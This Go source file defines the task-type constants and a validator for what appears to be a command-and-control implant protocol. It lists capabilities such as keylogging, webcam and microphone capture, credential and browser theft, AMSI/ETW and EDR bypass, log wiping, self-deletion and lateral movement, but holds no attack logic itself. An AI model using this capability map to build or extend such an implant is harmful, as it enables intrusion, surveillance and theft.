package protocol

const (
	TaskTypeTokenListProcs   = "token_list_procs"
	TaskTypeTokenSteal       = "token_steal"
	TaskTypeTokenMake        = "token_make"
	TaskTypeTokenRevert      = "token_revert"
	TaskTypeRev2Self         = "rev2self"
	TaskTypeTokenWhoami      = "token_whoami"
	TaskTypeNamedPipeImp     = "named_pipe_impersonate"
	TaskTypeJuicyPotato      = "juicy_potato"
	TaskTypeFodhelper        = "fodhelper"
	TaskTypeSlui             = "slui"
	TaskTypeEventvwr         = "eventvwr"
	TaskTypeComputerDefaults = "computerdefaults"
	TaskTypeSSHLateral       = "ssh_lateral"
	TaskTypeSSHKeygen        = "ssh_keygen"
	TaskTypeSSHTunnel        = "ssh_tunnel"
	TaskTypeSCPUpload        = "scp_upload"
	TaskTypeCloudSteal       = "cloud_steal"
	TaskTypeADCSESC1         = "adcs_esc1"
	TaskTypeADCSESC2         = "adcs_esc2"
	TaskTypeADCSESC3         = "adcs_esc3"
	TaskTypeADCSESC4         = "adcs_esc4"
	TaskTypeADCSESC5         = "adcs_esc5"
	TaskTypeADCSESC6         = "adcs_esc6"
	TaskTypeADCSESC7         = "adcs_esc7"
	TaskTypeADCSESC8         = "adcs_esc8"
	TaskTypeADCSFullAudit    = "adcs_full_audit"
	TaskTypeSetSleepMode     = "set_sleep_mode"
	TaskTypeGetSleepMode     = "get_sleep_mode"
	TaskTypeProfileRotate    = "profile_rotate"
	TaskTypeConfigPush       = "config_push"
	TaskTypeEdrStatus        = "edr_status"
	TaskTypeGhostModeStatus  = "ghost_mode_status"
	TaskTypeGhostModeExit    = "ghost_mode_exit"
	TaskTypeShell            = "shell"
	TaskTypePS               = "ps"
	TaskTypeScreenshot       = "screenshot"
	TaskTypeScreenshotWin    = "screenshot_window"
	TaskTypeScreenStreamSt   = "screen_stream_start"
	TaskTypeScreenStreamSp   = "screen_stream_stop"
	TaskTypeScreenWebRTCSt   = "screen_webrtc_start"
	TaskTypeScreenWebRTCSp   = "screen_webrtc_stop"
	TaskTypeKeylogStart      = "keylogger_start"
	TaskTypeKeylogStop       = "keylogger_stop"
	TaskTypeKeylogDump       = "keylogger_dump"
	TaskTypeSuspend          = "suspend"
	TaskTypeResume           = "resume"
	TaskTypeKillProc         = "killproc"
	// TaskTypeAbort cancels a running or queued task on the implant. It was implemented and
	// registered in the agent but had no spec, so it never appeared in the generated command
	// reference or the capability matrix: an operator could not discover it.
	TaskTypeAbort            = "abort"
	TaskTypeWindowList       = "window_list"
	TaskTypeWindowClose      = "window_close"
	TaskTypeClipboardGet     = "clipboard_get"
	TaskTypeClipboardSet     = "clipboard_set"
	TaskTypeWallpaper        = "wallpaper"
	TaskTypeFind             = "find"
	TaskTypeRegGet           = "reg_get"
	TaskTypeRegSet           = "reg_set"
	TaskTypeRegDelete        = "reg_delete"
	TaskTypeReboot           = "reboot"
	TaskTypeShutdown         = "shutdown"
	TaskTypeDrives           = "drives"
	TaskTypeBeaconNow        = "beacon_now"
	TaskTypeServices         = "services"
	TaskTypePortscan         = "portscan"
	TaskTypeNetstat          = "netstat"
	TaskTypeUsers            = "users"
	TaskTypeAV               = "av"
	TaskTypeDownloadURL      = "download_url"
	TaskTypeUninstall        = "uninstall"
	TaskTypeSetSleep         = "set_sleep"
	TaskTypeCreds            = "creds"
	TaskTypeInject           = "inject"
	TaskTypeInjectMethods    = "inject_methods"
	TaskTypeListInjectMeth   = "list_inject_methods"
	TaskTypeSpawn            = "spawn"
	TaskTypeShinject         = "shinject"
	TaskTypeShspawn          = "shspawn"
	TaskTypeLateral          = "lateral"
	TaskTypeMigrate          = "migrate"
	TaskTypeLateralWMI       = "lateral_wmi"
	TaskTypeLateralWinRM     = "lateral_winrm"
	TaskTypeLateralPsexec    = "lateral_psexec"
	TaskTypeLateralDCOM      = "lateral_dcom"
	TaskTypeLateralSCF       = "lateral_scf"
	TaskTypeLateralList      = "lateral_list"
	TaskTypeNetScanSMB       = "net_scan_smb"
	TaskTypeNetEnumHosts     = "net_enum_hosts"
	TaskTypeSocks            = "socks"
	TaskTypeKillAV           = "kill_av"
	TaskTypeElevate          = "elevate"
	TaskTypeBOF              = "bof"
	TaskTypeElevatePN        = "elevate_printnightmare"
	TaskTypeExecAssembly     = "execute_assembly"
	TaskTypeKerberoast       = "kerberoast"
	TaskTypeMimikatz         = "mimikatz"
	TaskTypeDPAPIMasterKey   = "dpapi_masterkey"
	TaskTypeDPAPIBlob        = "dpapi_blob"
	TaskTypeDPAPIBrowser     = "dpapi_browser"
	TaskTypeLSABypass        = "lsa_bypass"
	TaskTypeADCSFind         = "adcs_find"
	TaskTypeADCSRequest      = "adcs_request"
	TaskTypeShadowCreds      = "shadow_creds"
	TaskTypeLDAPUsers        = "ldap_users"
	TaskTypeLDAPGroups       = "ldap_groups"
	TaskTypeLDAPComputers    = "ldap_computers"
	TaskTypeLDAPSPN          = "ldap_spn"
	TaskTypeLDAPACL          = "ldap_acl"
	TaskTypeLDAPQuery        = "ldap_query"
	TaskTypeLS               = "ls"
	TaskTypeDelete           = "delete"
	TaskTypeRead             = "read"
	TaskTypeDownload         = "download"
	TaskTypeUpload           = "upload"
	TaskTypeMkdir            = "mkdir"
	TaskTypeRename           = "rename"
	TaskTypeChmod            = "chmod"
	TaskTypeNet              = "net"
	TaskTypePowerpick        = "powerpick"
	TaskTypePELoader         = "peloader"
	TaskTypeExecAssemblyFR   = "execute_assembly_forkrun"
	TaskTypeRPortFwdStart    = "rportfwd_start"
	TaskTypeRPortFwdStop     = "rportfwd_stop"
	TaskTypeLPortFwdStart    = "lportfwd_start"
	TaskTypeLPortFwdStop     = "lportfwd_stop"
	TaskTypeHostInfo         = "hostinfo"
	TaskTypeHelp             = "help"
	TaskTypeWebcam           = "webcam"
	TaskTypeMic              = "mic"
	TaskTypeDCSync           = "dcsync"
	TaskTypeGoldenTicket     = "golden_ticket"
	TaskTypeSilverTicket     = "silver_ticket"
	TaskTypeASREPRoast       = "asreproast"
	TaskTypePassTheHash      = "pass_the_hash"
	TaskTypePassTheTicket    = "pass_the_ticket"
	TaskTypePersistenceAdd   = "persistence_add"
	TaskTypePersistenceList  = "persistence_list"
	TaskTypePersistenceRem   = "persistence_remove"
	TaskTypeBrowserSteal     = "browser_steal"
	TaskTypeWeChatHistory    = "wechat_history"
	TaskTypeCookieExport     = "cookie_export"
	TaskTypeVPNCreds         = "vpn_creds"
	TaskTypeWifiCreds        = "wifi_creds"
	TaskTypePrivescCheck     = "privesc_check"
	TaskTypeRemoteInput      = "remote_input"
	TaskTypeUACBypass        = "uac_bypass"
	TaskTypeAMSIByPass       = "amsi_bypass"
	TaskTypeETWByPass        = "etw_bypass"
	TaskTypeETWNtraceBypass  = "etw_ntrace_bypass"
	TaskTypeAMSISessionByp   = "amsi_session_bypass"
	TaskTypeBlockDLLs        = "blockdlls"
	TaskTypeUnhookNtdll      = "unhook_ntdll"
	TaskTypeProtectProcess   = "protect_process"
	TaskTypeRunEvasion       = "run_evasion"
	TaskTypeCleanup          = "cleanup"
	TaskTypeLogWipe          = "log_wipe"
	TaskTypeTrackWipe        = "track_wipe"
	TaskTypeSelfDelete       = "self_delete"
	TaskTypeKill             = "kill"
	TaskTypeSelfUpdate       = "self_update"
	TaskTypeReflectDLLInject = "reflectdll_inject"

	// NTLM Relay & Coerce
	TaskTypeCoercePrinterBug = "coerce_printerbug"
	TaskTypeCoercePetitPotam = "coerce_petitpotam"
	TaskTypeCoerceDFS        = "coerce_dfs"
	TaskTypeRelayNTLMStart   = "relay_ntlm_start"
	TaskTypeRelayNTLMStop    = "relay_ntlm_stop"
	TaskTypeNTLMHelp         = "ntlm_help"

	// Certificate Store Theft
	TaskTypeCertStoreList = "cert_store_list"

	// CLR In-Process Execution
	TaskTypeCLRExecAssembly = "clr_exec_assembly"
	TaskTypeCLRPowerShell   = "clr_powershell"

	// Egress Detection
	TaskTypeRunEgress = "run_egress"

	// BloodHound / SharpHound
	TaskTypeSharpHound = "sharphound"

	// Multi-C2 Mode
	TaskTypeSetC2Mode = "set_c2_mode"

	// Interactive Shell
	TaskTypeInteractiveShellStart = "interactive_shell_start"
	TaskTypeInteractiveShellWrite = "interactive_shell_write"
	TaskTypeInteractiveShellStop  = "interactive_shell_stop"
	TaskTypeShellOutput           = "shell_output"

	// Tunnel / Reverse Network Tunnel (Chisel/ligolo-style)
	TaskTypeTunnelAddRoute    = "tunnel_add_route"
	TaskTypeTunnelRemoveRoute = "tunnel_remove_route"

	// P2P Mesh Auto-Discovery
	TaskTypeGossipDiscover = "gossip_discover"

	// Container escape
	TaskTypeContainerDetect = "container_detect"
	TaskTypeContainerEscape = "container_escape"
	TaskTypeContainerDocker = "container_docker"
	TaskTypeContainerK8s    = "container_k8s"

	// Sleep Mask Kit
	TaskTypeSetSleepMask         = "set_sleep_mask"
	TaskTypeSetSleepMaskAdvanced = "set_sleep_mask_advanced"

	// Sandbox Detection
	TaskTypeSandboxDetect         = "sandbox_detect"
	TaskTypeSandboxDetectAdvanced = "sandbox_detect_advanced"

	// AMSI/ETW Hardware Breakpoint Methods
	TaskTypeAMSIHardwareBP = "amsi_hardware_bp"
	TaskTypeETWHardwareBP  = "etw_hardware_bp"

	// Working Hours
	TaskTypeSetWorkingHours = "set_working_hours"

	// Per-Agent Kill Date
	TaskTypeSetKillDate   = "set_kill_date"
	TaskTypeClearKillDate = "clear_kill_date"

	// BOF Infection — download BOF from server and execute from memory
	TaskTypeBOFInfection = "bof_infection"

	// Kernel-Level Evasion
	TaskTypeEvasionKernelCallback = "kernel_callback"
	TaskTypeEvasionETWTI          = "etwti"
	TaskTypeEvasionEnumCallbacks  = "enum_callbacks"
	TaskTypeEvasionObjCB          = "objcb"
	TaskTypeEvasionImgLoad        = "imgload"

	// Kerberos Advanced Attacks
	TaskTypeFindDelegation   = "find_delegation"
	TaskTypeConstrainedDeleg = "constrained_deleg"
	TaskTypeRBCD             = "rbcd"
	TaskTypeBronzeBit        = "bronze_bit"
	TaskTypeAdminSDHolder    = "adminsdholder"
	TaskTypeDCSyncMachine    = "dcsync_machine"

	// Process list alias (implant handlePS; not a live tree viewer)
	TaskTypeProcessTree   = "process_tree"
	TaskTypePasswordSpray = "password_spray"

	// Single-credential validation against the domain (lockout-aware)
	TaskTypeCredCheck = "cred_check"

	TaskTypeTunStart  = "tun_start"
	TaskTypeTunStop   = "tun_stop"
	TaskTypeSccmRecon = "sccm_recon"
	TaskTypeEntraPRT  = "entra_prt"

	TaskTypeFileHunt           = "file_hunt"
	TaskTypeFileSearch         = "file_search"
	TaskTypeFileThumb          = "file_thumb"
	TaskTypeFileScan           = "file_scan"
	TaskTypeScreenTriggerStart = "screen_trigger_start"
	TaskTypeScreenTriggerStop  = "screen_trigger_stop"
	TaskTypeUSBEnum            = "usb_enum"
	TaskTypeUSBDrop            = "usb_drop"
	TaskTypeBrowserHistory     = "browser_history"
	TaskTypeSessionRecon       = "session_recon"

	// EDR pack (experimental, Windows-only). edr_blind/edr_kill/byovd_load
	// are approval-gated; ppl_check is read-only recon.
	TaskTypeEDRBlind  = "edr_blind"
	TaskTypeEDRKill   = "edr_kill"
	TaskTypeBYOVDLoad = "byovd_load"
	TaskTypePPLCheck  = "ppl_check"
)

// AllTaskTypes returns every defined task type constant in a deduplicated slice.
func AllTaskTypes() []string {
	return []string{
		TaskTypeShell,
		TaskTypePS,
		TaskTypeScreenshot,
		TaskTypeScreenshotWin,
		TaskTypeScreenStreamSt,
		TaskTypeScreenStreamSp,
		TaskTypeScreenWebRTCSt,
		TaskTypeScreenWebRTCSp,
		TaskTypeKeylogStart,
		TaskTypeKeylogStop,
		TaskTypeKeylogDump,
		TaskTypeSuspend,
		TaskTypeResume,
		TaskTypeKillProc,
		TaskTypeAbort,
		TaskTypeWindowList,
		TaskTypeWindowClose,
		TaskTypeClipboardGet,
		TaskTypeClipboardSet,
		TaskTypeFind,
		TaskTypeRegGet,
		TaskTypeRegSet,
		TaskTypeRegDelete,
		TaskTypeReboot,
		TaskTypeShutdown,
		TaskTypeDrives,
		TaskTypeBeaconNow,
		TaskTypeServices,
		TaskTypePortscan,
		TaskTypeNetstat,
		TaskTypeUsers,
		TaskTypeAV,
		TaskTypeDownloadURL,
		TaskTypeUninstall,
		TaskTypeSetSleep,
		TaskTypeCreds,
		TaskTypeInject,
		TaskTypeInjectMethods,
		TaskTypeListInjectMeth,
		TaskTypeSpawn,
		TaskTypeShinject,
		TaskTypeShspawn,
		TaskTypeLateral,
		TaskTypeMigrate,
		TaskTypeLateralWMI,
		TaskTypeLateralWinRM,
		TaskTypeLateralPsexec,
		TaskTypeLateralDCOM,
		TaskTypeLateralSCF,
		TaskTypeLateralList,
		TaskTypeNetScanSMB,
		TaskTypeNetEnumHosts,
		TaskTypeSocks,
		TaskTypeKillAV,
		TaskTypeElevate,
		TaskTypeBOF,
		TaskTypeElevatePN,
		TaskTypeExecAssembly,
		TaskTypeKerberoast,
		TaskTypeMimikatz,
		TaskTypeDPAPIMasterKey,
		TaskTypeDPAPIBlob,
		TaskTypeDPAPIBrowser,
		TaskTypeLSABypass,
		TaskTypeADCSFind,
		TaskTypeADCSRequest,
		TaskTypeShadowCreds,
		TaskTypeLDAPUsers,
		TaskTypeLDAPGroups,
		TaskTypeLDAPComputers,
		TaskTypeLDAPSPN,
		TaskTypeLDAPACL,
		TaskTypeLDAPQuery,
		TaskTypeLS,
		TaskTypeDelete,
		TaskTypeRead,
		TaskTypeDownload,
		TaskTypeUpload,
		TaskTypeMkdir,
		TaskTypeRename,
		TaskTypeChmod,
		TaskTypeNet,
		TaskTypePowerpick,
		TaskTypePELoader,
		TaskTypeExecAssemblyFR,
		TaskTypeRPortFwdStart,
		TaskTypeRPortFwdStop,
		TaskTypeLPortFwdStart,
		TaskTypeLPortFwdStop,
		TaskTypeHostInfo,
		TaskTypeHelp,
		TaskTypeWebcam,
		TaskTypeMic,
		TaskTypeWallpaper,
		TaskTypeDCSync,
		TaskTypeGoldenTicket,
		TaskTypeSilverTicket,
		TaskTypeASREPRoast,
		TaskTypePassTheHash,
		TaskTypePassTheTicket,
		TaskTypePersistenceAdd,
		TaskTypePersistenceList,
		TaskTypePersistenceRem,
		TaskTypeBrowserSteal,
		TaskTypeWeChatHistory,
		TaskTypeCookieExport,
		TaskTypeVPNCreds,
		TaskTypeWifiCreds,
		TaskTypePrivescCheck,
		TaskTypeRemoteInput,
		TaskTypeUACBypass,
		TaskTypeAMSIByPass,
		TaskTypeETWByPass,
		TaskTypeETWNtraceBypass,
		TaskTypeAMSISessionByp,
		TaskTypeBlockDLLs,
		TaskTypeUnhookNtdll,
		TaskTypeProtectProcess,
		TaskTypeRunEvasion,
		TaskTypeCleanup,
		TaskTypeLogWipe,
		TaskTypeTrackWipe,
		TaskTypeSelfDelete,
		TaskTypeKill,
		TaskTypeSelfUpdate,
		TaskTypeReflectDLLInject,
		TaskTypeCoercePrinterBug,
		TaskTypeCoercePetitPotam,
		TaskTypeCoerceDFS,
		TaskTypeRelayNTLMStart,
		TaskTypeRelayNTLMStop,
		TaskTypeNTLMHelp,
		TaskTypeCertStoreList,
		TaskTypeCLRExecAssembly,
		TaskTypeCLRPowerShell,
		TaskTypeRunEgress,
		TaskTypeSharpHound,
		TaskTypeSetC2Mode,
		TaskTypeInteractiveShellStart,
		TaskTypeInteractiveShellWrite,
		TaskTypeInteractiveShellStop,
		// Deliberately NOT included: shell_output is a RESULT type emitted by
		// the implant's interactive shell (see shell_interactive.go), not a
		// dispatchable task. Keeping it out of AllTaskTypes (and therefore
		// ValidTaskType) prevents operators/scripts from queuing a task that
		// no agent handler can execute.
		TaskTypeTunnelAddRoute,
		TaskTypeTunnelRemoveRoute,
		TaskTypeGossipDiscover,
		TaskTypeContainerDetect,
		TaskTypeContainerEscape,
		TaskTypeContainerDocker,
		TaskTypeContainerK8s,
		TaskTypeSetSleepMask,
		TaskTypeSetSleepMaskAdvanced,
		TaskTypeSandboxDetect,
		TaskTypeSandboxDetectAdvanced,
		TaskTypeAMSIHardwareBP,
		TaskTypeETWHardwareBP,
		TaskTypeSetWorkingHours,
		TaskTypeSetKillDate,
		TaskTypeClearKillDate,
		TaskTypeBOFInfection,
		TaskTypeEvasionKernelCallback,
		TaskTypeEvasionETWTI,
		TaskTypeEvasionEnumCallbacks,
		TaskTypeEvasionObjCB,
		TaskTypeEvasionImgLoad,
		TaskTypeFindDelegation,
		TaskTypeConstrainedDeleg,
		TaskTypeRBCD,
		TaskTypeBronzeBit,
		TaskTypeAdminSDHolder,
		TaskTypeDCSyncMachine,
		TaskTypeTokenListProcs,
		TaskTypeTokenSteal,
		TaskTypeTokenMake,
		TaskTypeTokenRevert,
		TaskTypeRev2Self,
		TaskTypeTokenWhoami,
		TaskTypeNamedPipeImp,
		TaskTypeJuicyPotato,
		TaskTypeFodhelper,
		TaskTypeSlui,
		TaskTypeEventvwr,
		TaskTypeComputerDefaults,
		TaskTypeSSHLateral,
		TaskTypeSSHKeygen,
		TaskTypeSSHTunnel,
		TaskTypeSCPUpload,
		TaskTypeCloudSteal,
		TaskTypeADCSESC1,
		TaskTypeADCSESC2,
		TaskTypeADCSESC3,
		TaskTypeADCSESC4,
		TaskTypeADCSESC5,
		TaskTypeADCSESC6,
		TaskTypeADCSESC7,
		TaskTypeADCSESC8,
		TaskTypeADCSFullAudit,
		TaskTypeSetSleepMode,
		TaskTypeGetSleepMode,
		TaskTypeProfileRotate,
		TaskTypeConfigPush,
		TaskTypeEdrStatus,
		TaskTypeGhostModeStatus,
		TaskTypeGhostModeExit,

		// Process list alias
		TaskTypeProcessTree,

		// Password Spray
		TaskTypePasswordSpray,

		// Credential Check
		TaskTypeCredCheck,
		TaskTypeTunStart,
		TaskTypeTunStop,
		TaskTypeSccmRecon,
		TaskTypeEntraPRT,
		TaskTypeFileHunt,
		TaskTypeFileSearch,
		TaskTypeFileThumb,
		TaskTypeFileScan,
		TaskTypeScreenTriggerStart,
		TaskTypeScreenTriggerStop,
		TaskTypeUSBEnum,
		TaskTypeUSBDrop,
		TaskTypeBrowserHistory,
		TaskTypeSessionRecon,
		TaskTypeEDRBlind,
		TaskTypeEDRKill,
		TaskTypeBYOVDLoad,
		TaskTypePPLCheck,
	}
}

var validTaskTypeSet map[string]struct{}

func init() {
	types := AllTaskTypes()
	validTaskTypeSet = make(map[string]struct{}, len(types))
	for _, t := range types {
		validTaskTypeSet[t] = struct{}{}
	}
}

// ValidTaskType returns true if the given type is a known task type constant.
func ValidTaskType(t string) bool {
	_, ok := validTaskTypeSet[t]
	return ok
}
